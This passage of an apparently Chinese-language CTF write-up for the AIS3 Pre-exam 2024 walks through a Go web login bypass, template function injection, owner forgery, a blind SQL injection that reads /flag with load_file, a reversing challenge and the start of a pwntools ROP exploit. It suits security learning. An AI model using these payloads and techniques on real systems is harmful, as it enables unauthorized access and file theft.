+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> _, err <span style="color:#ff79c6">:=</span> <span style="color:#50fa7b">GetUser</span>(user.Username); err <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">var</span> loginuser User
+</span></span><span style="display:flex;"><span>        result <span style="color:#ff79c6">:=</span> database.<span style="color:#50fa7b">GetDB</span>().<span style="color:#50fa7b">Where</span>(<span style="color:#ff79c6">&amp;</span>user).<span style="color:#50fa7b">First</span>(<span style="color:#ff79c6">&amp;</span>loginuser)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result.Error <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">nil</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> user.<span style="color:#50fa7b">Create</span>() <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>而這裡有個特性是如果 Json 裡沒有密碼欄的話就不會拿去比對，且後端似乎也沒檢查是否有密碼這欄。</p>
+<p>參考：https://www.ctfiot.com/123387.html</p>
+<p>所以可利用 burp 改封包，把 password 欄刪掉，資料庫查詢 <code>database.GetDB().Where(&amp;user).First(&amp;loginuser)</code>
+就只會比對帳號，而不比對密碼。</p>
+<p>接著看到 ../capoost/models/user/user.go 的 init() 中有一個叫 4dm1n1337 的管理員，可以透過此漏洞登入</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_7.png" alt="image"></p>
+<p>管理員可以新增或修改 templates，繼續分析程式碼</p>
+<p>在 ../capoost/router/post/post.go 的 readflag() 看起來很有趣，並且 read() 時若滿足 <code>Owner.ID == 1</code> (若 Owner 是管理員) 就會將該函式放到 template 的函式執行清單</p>
+<p>capoost/router/post</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">read</span>(c <span style="color:#ff79c6">*</span>gin.Context) {
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    t <span style="color:#ff79c6">:=</span> template.<span style="color:#50fa7b">New</span>(nowpost.Template)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> nowpost.Owner.ID <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> {
+</span></span><span style="display:flex;"><span>        t = t.<span style="color:#50fa7b">Funcs</span>(template.FuncMap{
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;G1V3m34Fl4gpL34s3&#34;</span>: readflag,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    t = template.<span style="color:#50fa7b">Must</span>(t.<span style="color:#50fa7b">ParseFiles</span>(path.<span style="color:#50fa7b">Join</span>(<span style="color:#f1fa8c">&#34;./template&#34;</span>, nowpost.Template)))
+</span></span><span style="display:flex;"><span>    b <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">new</span>(bytes.Buffer)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> err = t.<span style="color:#50fa7b">Execute</span>(b, nowpost.Data); err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">panic</span>(err)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(b.<span style="color:#50fa7b">String</span>(), <span style="color:#f1fa8c">&#34;AIS3&#34;</span>) {
+</span></span><span style="display:flex;"><span>        errutil.<span style="color:#50fa7b">AbortAndError</span>(c, <span style="color:#ff79c6">&amp;</span>errutil.Err{
+</span></span><span style="display:flex;"><span>            Code: <span style="color:#bd93f9">403</span>,
+</span></span><span style="display:flex;"><span>            Msg: <span style="color:#f1fa8c">&#34;Flag deny&#34;</span>,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">readflag</span>() <span style="color:#8be9fd">string</span> {
+</span></span><span style="display:flex;"><span>    out, _ <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;/readflag&#34;</span>).<span style="color:#50fa7b">Output</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> strings.<span style="color:#50fa7b">Trim</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34; \n\t&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以可以先透過管理員新增一個 template，內容為 <code>{{G1V3m34Fl4gpL34s3 | printf &quot;%q&quot; }}</code>，但後面又可以得知如果輸出有 AIS3 會被擋住，因此修改一下 payload：
+<code>{{G1V3m34Fl4gpL34s3 | printf &quot;%x&quot; }}</code>，讓 flag 以 hex 形式輸出，繞過檢查。</p>
+<p>而這裡也有一些 function 看起來可以繞過檢查，像是 slice:
+<a href="https://pkg.go.dev/text/template#hdr-Functions">https://pkg.go.dev/text/template#hdr-Functions</a></p>
+<p>然而管理員沒辦法新增貼文，但後來從 ../capoost/models/post/post.go 的 UnmarshalJSON
+發現其實可以在 post 封包新增 Owner 一欄，而蓋掉原本的 Owner，也就是可以偽造發文者</p>
+<p>capoost/models/post</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> (c <span style="color:#ff79c6">*</span>Post) <span style="color:#50fa7b">UnmarshalJSON</span>(b []<span style="color:#8be9fd">byte</span>) <span style="color:#8be9fd">error</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">var</span> tmp postjson
+</span></span><span style="display:flex;"><span>    err <span style="color:#ff79c6">:=</span> json.<span style="color:#50fa7b">Unmarshal</span>(b, <span style="color:#ff79c6">&amp;</span>tmp)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> err
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    c.ID = tmp.ID
+</span></span><span style="display:flex;"><span>    c.Title = tmp.Title
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> tmp.Owner <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> owner, err <span style="color:#ff79c6">:=</span> user.<span style="color:#50fa7b">GetUser</span>(tmp.Owner); err <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>            c.OwnerID = owner.ID
+</span></span><span style="display:flex;"><span>            c.Owner = owner
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    c.Template = tmp.Template
+</span></span><span style="display:flex;"><span>    c.Data = tmp.Data
+</span></span><span style="display:flex;"><span>    c.Count = tmp.Count
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以先登入一般使用者帳號，然後新增一個 Owner 為 4dm1n1337，template 為剛剛創建的 template，</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_8.png" alt="image"></p>
+<p>再點進去就能看到 hex(flag) : 414953337b676f5f347734795f5768595f4172335f7930555f483352335f4361706f6f3a287d</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_9.png" alt="image"></p>
+<p>解碼後就能得到</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_10.png" alt="image"></p>
+<h4 id="flag-5">FLAG:</h4>
+<p>AIS3{go_4w4y_WhY_Ar3_y0U_H3R3_Capoo:(}</p>
+<h3 id="its-mygo">It&rsquo;s MyGO!!!!</h3>
+<pre tabindex="0"><code>你說得對，但是《Bang Dream It&#39;s MyGO!!!!!》是由武士道企劃的日本少女搖滾樂團。 故事發生在一個被稱為《Bang Dream》的世界觀中，在這裏，不同的少女們將拿起樂器組成樂團。 主角名為「千早愛音」，在愛慕虛榮的引導下邂逅性格沉重的樂團夥伴們，和她們一起舉辦演唱會，找回失落的春日影--同時，逐步發掘「CRYCHIC」的真相。
+
+flag format: AIS3{.+}
+
+charset: unicode
+
+flag is at /flag
+
+http://chals1.ais3.org:11454
+
+Author: ItisCaleb
+</code></pre><p>這題是我賽後才補上的，因為 Union 被擋住讓我卡好久&hellip;orz</p>
+<p>網頁中有送 Data 的地方只有那四首原創曲</p>
+<p><code>http://chals1.ais3.org:11454/song?id=xxx</code></p>
+<p>提示說是 MySQL 就想到跟 SQLi 有關，然而如果 SQL 語句有錯網頁會直接不回應 (Timeout)。</p>
+<p>作者說因為有兩條指令所以 Union 沒辦法用</p>
+<p>而如果送 <code>id=1 and 1=2</code> 會得到 No Data</p>
+<p>所以現在只能用 Boolean Based SQLi 了。</p>
+<p>Payload：</p>
+<pre tabindex="0"><code>id=1 and ascii(substr((select load_file(&#39;/flag&#39;) limit 0,1),X,1)) &gt; Y
+</code></pre><ul>
+<li>load_file()：MySQL 讀檔案的方法</li>
+<li>limit n, m：從第 n 筆開始取 m 筆資料</li>
+<li>substr(x, y, z)：將字串 x 從第 y 個字開始切 z 個字</li>
+<li>ascii()：把字元用 ASCII 轉換成數字</li>
+</ul>
+<p>因為只能知道 True 或 False，所以 X 跟 Y 要慢慢搜，先將 Y 設為 0，X 從 1 到 100 開始二分搜，可以知道 FLAG 的長度為 62</p>
+<p>接著我們已經知道 FLAG 格式為 AIS3{.+}，前五個字跟最後一個字可以不用搜尋</p>
+<p>所以要先固定 X，然後二分搜 Y 的值(1<del>256，因為 UTF-8 一個字元是 0</del>256)，如果結果是 No Data 表示搜尋的值 &gt;= target，否則就是 &lt; target</p>
+<p>就這樣一個字元一個字元找</p>
+<pre tabindex="0"><code>http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file(&#39;/flag&#39;) limit 0,1),1,1)) &gt; 65
+http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file(&#39;/flag&#39;) limit 0,1),1,1)) &gt; 97
+http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file(&#39;/flag&#39;) limit 0,1),1,1)) &gt; 81
+...
+</code></pre><p>以此類推得到結果為：</p>
+<pre tabindex="0"><code>&#34;AIS3{CRYCHIC_Funeral_&#34; + 
+240,159,152,173,
+240,159,142,184,
+240,159,152,173,
+240,159,142,184,
+240,159,152,173,
+240,159,142,164,
+240,159,152,173,
+240,159,165,129,
+240,159,152,184,
+240,159,142,184
+}
+</code></pre><p>這些超出 ASCII 範圍的數字可以到 <a href="https://www.utf8-chartable.de/unicode-utf8-table.pl">https://www.utf8-chartable.de/unicode-utf8-table.pl</a> 查表，四個數字為一組</p>
+<p>就可以得到最終 FLAG</p>
+<h4 id="flag-6">FLAG：</h4>
+<p>AIS3{CRYCHIC_Funeral_😭🎸😭🎸😭🎤😭🥁😸🎸}</p>
+<h2 id="rev">Rev</h2>
+<h3 id="the-long-print">The Long Print</h3>
+<pre tabindex="0"><code>Welcome to The Long Print, a challenge where patience is not just a virtue—it&#39;s a requirement. But don&#39;t be fooled; waiting around won&#39;t get you the flag. This task requires your sharp reverse engineering skills to dive into the depths of an ELF binary, seemingly designed with all the time in the world in mind.
+</code></pre><p>開 IDA</p>
+<p>把 sleep 的參數改成 0</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/the_long_print_1.png" alt="image"></p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/the_long_print_2.png" alt="image"></p>
+<p>分析程式碼發現輸出可能被藏起來了，可以使用 strings 指令印出來</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/the_long_print_3.png" alt="image"></p>
+<h4 id="flag-7">FLAG:</h4>
+<p>AIS3{You_are_the_master_of_time_management!!!!?}</p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="mathter">Mathter</h3>
+<pre tabindex="0"><code>Life may betray you, brothers may deceive you, but mathematics never will. Becaaaaaaaaaaause: math
+</code></pre><pre tabindex="0"><code>Connection info: nc chals1.ais3.org 50001
+
+Author: Kazma
+</code></pre><p>看 Checksec</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/mathter_1.png" alt="image"></p>
+<ul>
+<li>Partial RELRO</li>
+<li>有開 Canary</li>
+<li>不可執行</li>
+<li>沒開 ASLR</li>
+</ul>
+<p>開 IDA，其中 goodbye() 有 Buffer Overflow</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/mathter_2.png" alt="image"></p>
+<p>可以注意到其實他沒有 Canary，可以用 padding 去蓋 return address。</p>
+<p>後來又發現有兩個函式看起來會印 flag</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/mathter_3.png" alt="image"></p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/mathter_4.png" alt="image"></p>
+<p>這兩個函式都會先看第一個參數 (rdi) 的值才決定要不要印 flag，所以用 ROPgadget 看看能不能控制 rdi</p>
+<pre tabindex="0"><code>$ ROPgadget --binary mathter | grep &#39;pop rdi&#39;
+</code></pre><p><img src="/images/ctf/ais3_pre_exam_2024/mathter_5.png" alt="image"></p>
+<p>有料，開寫 exploit</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;./mathter&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>os <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;linux&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;DEBUG&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;chals1.ais3.org&#39;</span>
+</span></span><span style="display:flex;"><span>    port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">50001</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;_|</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">__</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">___|_|</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;q&#39;</span>) <span style="color:#6272a4"># 進 goodbye()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pad <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">12</span> <span style="color:#6272a4"># 4 bytes 字元 + 8 bytes offset</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>win1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4018c5</span> <span style="color:#6272a4"># win 1 的 address</span>
+</span></span><span style="display:flex;"><span>win2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x401997</span> <span style="color:#6272a4"># win 2 的 address</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x402540</span> <span style="color:#6272a4"># 找到的 Gadget 的 address</span>
+</span></span><span style="display:flex;"><span>
